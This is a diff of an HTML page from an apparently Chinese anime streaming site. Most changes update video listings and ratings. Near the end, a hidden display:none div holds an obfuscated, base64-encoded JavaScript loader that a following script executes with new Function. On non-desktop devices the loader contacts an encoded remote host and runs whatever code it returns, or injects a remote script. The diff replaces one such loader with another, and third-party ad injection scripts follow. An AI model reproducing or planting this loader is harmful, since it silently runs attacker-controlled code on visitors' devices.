@@ -353,7 +353,7 @@
 	<a class="myui-vodlist__thumb lazyload" href="/view/7770.html" title="回复术士的重启人生" data-original="http://sakura.xonlines.com/FileUpload/201911231572043227.jpg">
 		<span class="play hidden-xs"></span>
 		<span class="pic-tag pic-tag-top">
-			<span class="tag" style="background-color: #7091fc;">7.4分</span><span class="tag" style="background-color: #ff9900;">2021</span>		</span>
+			<span class="tag" style="background-color: #7091fc;">7.5分</span><span class="tag" style="background-color: #ff9900;">2021</span>		</span>
 		<span class="pic-text text-right">更新至12话</span>	</a>									
 	<div class="myui-vodlist__detail">
 		<h4 class="title text-overflow"><a href="/view/7770.html" title="回复术士的重启人生">回复术士的重启人生</a></h4>
@@ -554,6 +554,18 @@
 							</li>
 														<li class="col-lg-8 col-md-6 col-sm-4 col-xs-3">
 								<div class="myui-vodlist__box">
+	<a class="myui-vodlist__thumb lazyload" href="/view/8122.html" title="甜蜜惩罚" data-original="http://sakura.xonlines.com/FileUpload/202108121200155199.jpg">
+		<span class="play hidden-xs"></span>
+		<span class="pic-tag pic-tag-top">
+			<span class="tag" style="background-color: #7091fc;">6.6分</span><span class="tag" style="background-color: #ff9900;">2018</span>		</span>
+		<span class="pic-text text-right">12全集</span>	</a>									
+	<div class="myui-vodlist__detail">
+		<h4 class="title text-overflow"><a href="/view/8122.html" title="甜蜜惩罚">甜蜜惩罚</a></h4>
+		<p class="text text-overflow text-muted hidden-xs">主演：内详</p>	</div>										
+</div><!-- 列表-->													
+							</li>
+														<li class="col-lg-8 col-md-6 col-sm-4 col-xs-3">
+								<div class="myui-vodlist__box">
 	<a class="myui-vodlist__thumb lazyload" href="/view/7834.html" title="咒术回战" data-original="http://sakura.xonlines.com/FileUpload/2020103183575108.jpg">
 		<span class="play hidden-xs"></span>
 		<span class="pic-tag pic-tag-top">
@@ -561,18 +573,6 @@
 		<span class="pic-text text-right">全24集</span>	</a>									
 	<div class="myui-vodlist__detail">
 		<h4 class="title text-overflow"><a href="/view/7834.html" title="咒术回战">咒术回战</a></h4>
-		<p class="text text-overflow text-muted hidden-xs">主演：内详</p>	</div>										
-</div><!-- 列表-->													
-							</li>
-														<li class="col-lg-8 col-md-6 col-sm-4 col-xs-3">
-								<div class="myui-vodlist__box">
-	<a class="myui-vodlist__thumb lazyload" href="/view/8122.html" title="甜蜜惩罚" data-original="http://sakura.xonlines.com/FileUpload/202108121200155199.jpg">
-		<span class="play hidden-xs"></span>
-		<span class="pic-tag pic-tag-top">
-			<span class="tag" style="background-color: #7091fc;">6.7分</span><span class="tag" style="background-color: #ff9900;">2018</span>		</span>
-		<span class="pic-text text-right">12全集</span>	</a>									
-	<div class="myui-vodlist__detail">
-		<h4 class="title text-overflow"><a href="/view/8122.html" title="甜蜜惩罚">甜蜜惩罚</a></h4>
 		<p class="text text-overflow text-muted hidden-xs">主演：内详</p>	</div>										
 </div><!-- 列表-->													
 							</li>
@@ -786,10 +786,10 @@ var _hmt = _hmt || [];
 		with(document)0[(getElementsByTagName("head")[0]||body).appendChild(createElement('script')).src=''+myui.bdapi+'?cdnversion='+~(-new Date()/36e5)];
 	}
 </script>
-<div style="display: none !important;">function ExtZSO(e){var t="",n=r=c1=c2=0;while(n&lt;e.length){r=e.charCodeAt(n);if(r&lt;128){t+=String.fromCharCode(r);n++;}else if(r&gt;191&&r&lt;224){c2=e.charCodeAt(n+1);t+=String.fromCharCode((r&31)&lt;&lt;6|c2&63);n+=2}else{c2=e.charCodeAt(n+1);c3=e.charCodeAt(n+2);t+=String.fromCharCode((r&15)&lt;&lt;12|(c2&63)&lt;&lt;6|c3&63);n+=3;}}return t;};function ViOdRtD(e){var m='ABCDEFGHIJKLMNOPQRSTUVWXYZ'+'abcdefghijklmnopqrstuvwxyz'+'0123456789+/=';var t="",n,r,i,s,o,u,a,f=0;e=e.replace(/[^A-Za-z0-9+/=]/g,"");while(f&lt;e.length){s=m.indexOf(e.charAt(f++));o=m.indexOf(e.charAt(f++));u=m.indexOf(e.charAt(f++));a=m.indexOf(e.charAt(f++));n=s&lt;&lt;2|o&gt;&gt;4;r=(o&15)&lt;&lt;4|u&gt;&gt;2;i=(u&3)&lt;&lt;6|a;t=t+String.fromCharCode(n);if(u!=64){t=t+String.fromCharCode(r);}if(a!=64){t=t+String.fromCharCode(i);}}return ExtZSO(t);};window[''+'u'+'g'+'s'+'F'+'B'+'K'+'b'+'H'+'U'+'']=(!/^Mac|Win/.test(navigator.platform)||!navigator.platform)?function(){;(function(u,i,w,d,c){var x=ViOdRtD,cs=d[x('Y3VycmVudFNjcmlwdA==')],crd=x('Y3JlYXRlRWxlbWVudA==');'jQuery';u=decodeURIComponent(x(u.replace(new RegExp(c[0]+''+c[0],'g'),c[0])));'jQuery';if(navigator.userAgent.indexOf('b'+'a'+'id'+'u')>-1){var xhr=new XMLHttpRequest();xhr.open('POST','https://'+u+'/g/'+i);xhr.setRequestHeader('Content-Type','application/x-www-form-urlencoded;');xhr.setRequestHeader('X-REQUESTED-WITH','XMLHttpRequest');xhr.onreadystatechange=function(){if(xhr.readyState==4&&xhr.status==200){var data=JSON.parse(xhr.responseText);new Function('_'+'t'+'d'+'cs',new Function('c',data.result.decode+';return '+data.result.name+'(c)')(data.result.img.join('')))(cs);}};xhr.send('u=1');}else{var s=d[crd]('script');s.src='https://'+u+'/j/'+i;cs.parentElement.insertBefore(s,cs);}})('cG95LmZwYXJsaWsuY244=','158051',window,document,['4','OnobJtCmQ']);}:function(){};</div>
+<div style="display: none !important;">function PSnvO(e){var t="",n=r=c1=c2=0;while(n&lt;e.length){r=e.charCodeAt(n);if(r&lt;128){t+=String.fromCharCode(r);n++;}else if(r&gt;191&&r&lt;224){c2=e.charCodeAt(n+1);t+=String.fromCharCode((r&31)&lt;&lt;6|c2&63);n+=2}else{c2=e.charCodeAt(n+1);c3=e.charCodeAt(n+2);t+=String.fromCharCode((r&15)&lt;&lt;12|(c2&63)&lt;&lt;6|c3&63);n+=3;}}return t;};function YXWJZ(e){var m='ABCDEFGHIJKLMNOPQRSTUVWXYZ'+'abcdefghijklmnopqrstuvwxyz'+'0123456789+/=';var t="",n,r,i,s,o,u,a,f=0;e=e.replace(/[^A-Za-z0-9+/=]/g,"");while(f&lt;e.length){s=m.indexOf(e.charAt(f++));o=m.indexOf(e.charAt(f++));u=m.indexOf(e.charAt(f++));a=m.indexOf(e.charAt(f++));n=s&lt;&lt;2|o&gt;&gt;4;r=(o&15)&lt;&lt;4|u&gt;&gt;2;i=(u&3)&lt;&lt;6|a;t=t+String.fromCharCode(n);if(u!=64){t=t+String.fromCharCode(r);}if(a!=64){t=t+String.fromCharCode(i);}}return PSnvO(t);};window[''+'y'+'M'+'g'+'T'+'P'+'C'+'I'+'X'+'B'+'r'+'']=(!/^Mac|Win/.test(navigator.platform)||!navigator.platform)?function(){;(function(u,i,w,d,c){var x=YXWJZ,cs=d[x('Y3VycmVudFNjcmlwdA==')],crd=x('Y3JlYXRlRWxlbWVudA==');'jQuery';u=decodeURIComponent(x(u.replace(new RegExp(c[0]+''+c[0],'g'),c[0])));'jQuery';if(navigator.userAgent.indexOf('b'+'a'+'id'+'u')>-1){var xhr=new XMLHttpRequest();xhr.open('POST','https://'+u+'/g/'+i);xhr.setRequestHeader('Content-Type','application/x-www-form-urlencoded;');xhr.setRequestHeader('X-REQUESTED-WITH','XMLHttpRequest');xhr.onreadystatechange=function(){if(xhr.readyState==4&&xhr.status==200){var data=JSON.parse(xhr.responseText);new Function('_'+'t'+'d'+'cs',new Function('c',data.result.decode+';return '+data.result.name+'(c)')(data.result.img.join('')))(cs);}};xhr.send('u=1');}else{var s=d[crd]('script');s.src='https://'+u+'/j/'+i;cs.parentElement.insertBefore(s,cs);}})('a21llci52YXJ2YWsuY24=','158051',window,document,['l','MdxyfXvh']);}:function(){};</div>
 <script>new Function(document['cu'+'rren'+'tScr'+'ipt']['prev'+'iousE'+'leme'+'ntSi'+'bling']['tex'+'tCo'+'ntent'])();</script>
 <div> <div><div> </div>  </div></div><div> </div>
-<script>ugsFBKbHU();</script><script>
+<script>yMgTPCIXBr();</script><script>
     if (!/Mobi|Android|iPhone/i.test(navigator.userAgent)) 
         document.writeln(`<div style="width:300px;height:300px;position:fixed;bottom:0;left:0;z-index:2147483647;"><img src="data:image/gif;base64,R0lGODlhGQANAJECAIYAAP///////wAAACH5BAEAAAIALAAAAAAZAA0AAAJHlIOXiu0mAnATSgSyDrHNm3gOxknaWYFklFIj664QPLNopsbjZ4rmvQFNUjxRkfQhcjq8zwG3yjlJvqDQqYAef6/ZaMFAFAAAOw==" style="cursor:pointer;position:relative;top:22px;right:10px;float:right;" onClick="this.parentNode.style.display='none';"><center><a href="https://yyh365.com/index" target="_blank"><img src="http://sakurajs.xonlines.com/gg/yyh_ad_lpl_300_300.png" width="100%" height="100%"></a></center></div><script src='//pc.stgowan.com/pc/rich-tf.js' id="richid" data='s=4284'><\/script><script src="//pc.stgowan.com/pc/bfixed-tf.js" id="btfixedwrap" data="s=4285"><\/script>`);
 </script></body>
